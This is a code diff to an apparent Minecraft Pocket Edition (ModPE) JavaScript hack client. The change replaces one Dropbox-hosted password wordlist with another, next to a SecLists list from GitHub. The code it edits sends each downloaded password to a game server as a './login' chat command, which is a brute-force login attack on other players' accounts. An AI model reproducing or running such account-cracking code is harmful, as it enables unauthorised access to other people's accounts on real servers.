@@ -85,7 +85,7 @@ var newnamet = '';
 var checkslapper = false;
 var allDePasswords;
 var numhack3 = 0;
-var fuckdepasswords;
+var fuckDePasswords;
 var numhack4 = 0;
 /*B͎̞̠̠̘̙͈̳͙̳̅͛̽̉͑o̥̤̥̗̥͈̯̯̳̹ͥ̊ͮͭo̠͈̼̱͖̖͂̐̄̉͂͂ͭl͕̰͙̰ͮ̂̐͐͒͂̽̑e̘͈̤̫̟̫̦̞͙̻̲̤͓͓͉̘͇̔̆ͨͧ͊̏̍ͩͥa͕͖͚̟͖̟̫͉̱̗̪͍̾̈́̇̎ͭͭ̈̚ͅͅǹ̫͔̘̤̻̼̫̝͔̙̻͓͕̰͇̘ͮ̂̏̎ͣ̉͛̓ͫ̚ͅs̼͍̤͇̞̝̱͎̺̟͇̮̘̣̪̲̤ͯ̆̂͊͆̾́͐ͨͣ͂ͣ*/
 var abcabc123 = false;
@@ -927,12 +927,16 @@ var passurl = "https://raw.githubusercontent.com/danielmiessler/SecLists/master/
     var jsoncontent3 = ModPE.getFromUrl(passurl);
     var storpass = jsoncontent3;
     allDePasswords = storpass.split("\n");
-var passurl2 = "https://dl.dropboxusercontent.com/content_link/uDpNoC5Rd6TZbvaMwBcmEL8PS10tTRZmcFzhgBCN72NqxB7FzA0qUfXWawNmjeSo/file";
-    var jsoncontent4 = ModPE.getFromUrl(passurl2);
-    var storpass2 = jsoncontent4;
-    fuckdepasswords = storpass2.split("\n");
 }
 getPasses();
+
+function getPasses2(){
+var passurll = "https://www.dropbox.com/s/3cz9w5boq8kmrcp/the_list.txt?raw=1";
+    var jsonconten = ModPE.getFromUrl(passurll);
+    var savedepass = jsonconten;
+    fuckDePasswords = savedepass.split("\n");
+}
+getPasses2();
 
 function newLevel() {
 	clientMessage("§2≡≡=======»§a>§9 §a§kAlpha§r §a<§2«======≡≡§f§r");
@@ -18716,7 +18720,7 @@ function rptask3() {
 						}
 						if (finalpass){
 							numhack4++
-							let lbsgpasswords = fuckdepasswords[numhack4];
+							let lbsgpasswords = fuckDePasswords[numhack4];
 							Server.sendChat("./login "+lbsgpasswords);
 							clientMessage(client + "(" + numhack4 + ") "+lbsgpasswords);
 						}
